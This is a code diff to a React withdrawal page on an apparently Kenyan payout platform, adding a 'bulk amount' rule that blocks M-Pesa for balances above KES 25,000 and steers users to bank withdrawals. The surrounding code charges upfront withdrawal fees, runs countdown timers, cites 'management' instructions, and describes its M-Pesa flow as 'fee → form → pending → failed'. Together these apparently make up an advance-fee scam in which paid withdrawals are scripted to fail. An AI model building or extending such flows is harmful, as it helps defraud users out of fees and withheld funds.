@@ -97,6 +97,9 @@ const FEE_KES    = Math.round(FEE_USD * USD_TO_KES); // = KES 650
 const BANK_FEE_USD = 23;
 const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES); // = KES 2,990
 
+// Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
+const BULK_THRESHOLD_KES = 25000;
+
 // ── M-Pesa flow (fee → form → pending → failed) ───────────────────────────────
 function MpesaFlow({ user, initialStep }) {
   const router = useRouter();
@@ -155,6 +158,21 @@ function MpesaFlow({ user, initialStep }) {
 
   const isLow = remaining < 30 * 1000;
   const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
+
+  // Bulk amounts (above KES 25,000) must be withdrawn through the bank, not M-Pesa.
+  if (Number(user?.balance || 0) > BULK_THRESHOLD_KES) {
+    return (
+      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="📲" accent="linear-gradient(135deg, #007A3D, #00A651)">
+        <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
+          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Because this is a <strong>bulk amount</strong> (above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>), it must be withdrawn <strong>through the bank</strong>, not M-Pesa.
+        </div>
+        <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)' }} onClick={() => router.push('/withdraw?method=international')}>
+          🏦 Withdraw via Bank
+        </button>
+        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>← Back to Dashboard</button>
+      </FlowShell>
+    );
+  }
 
   return (
     <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="📲" accent="linear-gradient(135deg, #007A3D, #00A651)">
@@ -295,13 +313,25 @@ function PostbankFlow({ user, initialStep }) {
     setStep('pending');
   }
 
-  const isLow  = remaining < 30 * 1000;
-  const pct    = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
-  const accent = 'linear-gradient(135deg, #1D4ED8, #2563EB)';
+  const isLow    = remaining < 30 * 1000;
+  const pct      = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
+  const accent   = 'linear-gradient(135deg, #1D4ED8, #2563EB)';
+  const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
 
   return (
     <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="🏦" accent={accent}>
-      {step === 'choice' && (
+      {step === 'choice' && overLimit && (
+        <>
+          <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
+            Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
+          </div>
+          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
+            🏦 Continue with Postbank Kenya
+          </button>
+        </>
+      )}
+
+      {step === 'choice' && !overLimit && (
         <>
           <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
             You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong> — it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
@@ -504,9 +534,20 @@ function InternationalFlow({ user, initialStep }) {
   // M-Pesa / management gate — shown before any bank withdrawal (all banks)
   if (gate !== 'form') {
     const accent = 'linear-gradient(135deg, #1D4ED8, #2563EB)';
+    const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
     return (
       <FlowShell title="Withdraw from Other Countries" subtitle="Choose your method" icon="🌍" accent={accent}>
-        {gate === 'mpesa' && (
+        {gate === 'mpesa' && overLimit && (
+          <>
+            <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
+              Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with a bank withdrawal below.
+            </div>
+            <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('fee')}>
+              🏦 Continue with a bank withdrawal
+            </button>
+          </>
+        )}
+        {gate === 'mpesa' && !overLimit && (
           <>
             <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
               For faster, check-free payouts we recommend <strong>M-Pesa (Safaricom)</strong> where available — it’s instant and avoids the extra verification checks that bank transfers require. Only use a <strong>bank</strong> if you can’t use M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
@@ -655,11 +696,18 @@ export default function WithdrawPage() {
   if (method === 'international')  return <InternationalFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'mpesa'} />;
 
   // Chooser
+  const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
   return (
     <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="💸">
-      <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=mpesa')}>
+      {overLimit && (
+        <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB', marginBottom: 14 }}>
+          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa.
+        </div>
+      )}
+      <button className="pay-btn" style={{ background: overLimit ? '#9CA3AF' : 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: overLimit ? 6 : 14, opacity: overLimit ? 0.65 : 1, cursor: overLimit ? 'not-allowed' : 'pointer' }} disabled={overLimit} onClick={() => router.push('/withdraw?method=mpesa')}>
         📲 Withdraw with M-Pesa
       </button>
+      {overLimit && <div style={{ fontSize: 12, color: '#B45309', marginBottom: 14 }}>M-Pesa is unavailable for bulk balances — please use a bank option below.</div>}
       <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
         🏦 Withdraw with Postbank Kenya
       </button>
